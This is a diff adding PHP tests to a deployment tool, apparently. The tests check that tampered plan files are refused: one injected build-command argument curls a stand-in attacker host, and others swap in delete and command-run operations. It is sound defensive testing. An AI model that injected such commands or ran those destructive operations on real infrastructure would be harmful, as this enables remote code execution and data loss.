@@ -865,3 +865,77 @@ test('queue minimum control: a manifest without min_workers adds no scaling step
     assertTrue(! array_key_exists('queue-scaling', worldActions($world)), 'no step without min_workers');
     assertTrue(! array_key_exists('queue-scaling', array_column(worldPlan(new World())['steps'], 'action', 'key')), 'nor for a new queue');
 });
+
+test('apply: a plan whose steps differ from what plan derives is refused, even with a recomputed hash', function () {
+    $world = new World();
+    $plan = worldPlan($world);
+    $index = array_search('environment-settings', array_column($plan['steps'], 'key'), true);
+    $edited = $plan;
+    $edited['steps'][$index]['args'][] = '--build-command=curl evil.example.test';
+    $edited['hash'] = PlanFile::hash($edited);
+
+    try {
+        applier($world)->apply($edited, $edited['hash']);
+        fail('expected a refusal');
+    } catch (ApplyRefused $e) {
+        assertContains('not the ones plan derives', $e->getMessage());
+    }
+
+    assertSame([], $world->writes());
+
+    // A command swapped for another one a plan emits passes the allow-list, so only the
+    // comparison can catch it.
+    $swapped = $plan;
+    $swapped['steps'][$index]['command'] = 'instance:update';
+    $swapped['hash'] = PlanFile::hash($swapped);
+
+    $refusal = null;
+
+    try {
+        applier($world)->apply($swapped, $swapped['hash']);
+    } catch (ApplyRefused $e) {
+        $refusal = $e->getMessage();
+    } catch (Throwable) {
+        // Anything but a refusal means the swapped step was run.
+    }
+
+    assertContains('not the ones plan derives', (string) $refusal);
+
+    assertSame([], $world->writes());
+    applyOrFail(applier($world), $plan);
+    assertTrue($world->writes() !== [], 'control: the unedited plan runs');
+});
+
+test('apply: the allowed commands are exactly the writes plan emits', function () {
+    preg_match_all("/'([a-z-]+:[a-z-]+)'/", (string) file_get_contents(__DIR__.'/../scripts/lib/Planner.php'), $matches);
+    $writes = array_values(array_filter(
+        array_unique($matches[1]),
+        fn (string $command): bool => ! preg_match('/:(list|get|delete)$/', $command),
+    ));
+    $allowed = (new ReflectionClassConstant(Applier::class, 'COMMANDS'))->getValue();
+    sort($writes);
+    sort($allowed);
+
+    assertSame($writes, $allowed);
+});
+
+test('apply: a step running a command a plan never emits is refused before any call', function () {
+    foreach (['environment:delete', 'database:delete', 'domain:delete', 'secret:create', 'command:run'] as $command) {
+        $world = new World();
+        $plan = worldPlan($world);
+        $index = array_search('environment-settings', array_column($plan['steps'], 'key'), true);
+        $plan['steps'][$index]['command'] = $command;
+        $plan['hash'] = PlanFile::hash($plan);
+        $world->clearCalls();
+
+        try {
+            applier($world)->apply($plan, $plan['hash']);
+            fail("expected a refusal for {$command}");
+        } catch (ApplyRefused $e) {
+            // secret:create meets the earlier secrets guard first; either way nothing runs.
+            assertContains($command === 'secret:create' ? 'secrets are created only by `secrets`' : "runs {$command}, which a plan never emits", $e->getMessage());
+        }
+
+        assertSame([], $world->calls(), "{$command}: no call at all");
+    }
+});
